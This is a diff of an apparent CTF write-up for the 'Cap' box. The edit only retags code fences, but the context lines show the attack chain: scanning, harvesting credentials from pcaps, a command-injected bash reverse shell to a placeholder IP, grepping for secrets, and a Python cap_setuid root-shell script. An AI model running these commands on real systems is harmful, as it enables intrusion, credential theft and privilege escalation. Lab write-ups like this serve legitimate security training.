@@ -20,7 +20,7 @@ The landing page hinted at packet captures and network stats. That immediately s
 # Quick scan
 export TARGET=<IP>
 nmap -p- -sC -sV -oN nmap_full $TARGET
-```
+```text
 
 ## The Small Win That Opened Everything
 Exploring the site led me to a place where I could fetch or view capture files (pcaps). I grabbed what I could and inspected it locally. This box rewards patience: download → inspect → repeat.
@@ -35,7 +35,7 @@ strings -n 8 traffic.pcap | head
 
 # Extract potential HTTP auth hints with tshark
 tshark -r traffic.pcap -Y http.authorization -T fields -e http.authorization
-```
+```text
 
 If HTTP Basic credentials show up, decode and test them. Credentials in captures are more common than we want to admit. After validating, I used them to authenticate (SSH/web) and get a foothold.
 
@@ -48,7 +48,7 @@ rlwrap nc -lvnp 4444
 
 # Payload example
 ;bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'
-```
+```text
 
 ## PrivEsc Thoughts
 I kept the same flow I use on easy boxes: check sudo, SUIDs, cron, and app configs. On this host the name "Cap" is a hint: Linux capabilities. Finding a Python binary with `cap_setuid=ep` made escalation straightforward.
@@ -58,7 +58,7 @@ sudo -l || true
 find / -perm -4000 -type f 2>/dev/null
 getcap -r / 2>/dev/null | grep -i cap_setuid || true
 grep -R "PASS\|SECRET\|TOKEN" -n /var/www 2>/dev/null
-```
+```text
 
 If Python has `cap_setuid=ep`, this tiny script does the job:
 
@@ -68,7 +68,7 @@ import os, pty
 os.setuid(0)
 pty.spawn('/bin/bash')
 PY
-```
+```text
 
 ## Flags
 - User flag: collected after foothold
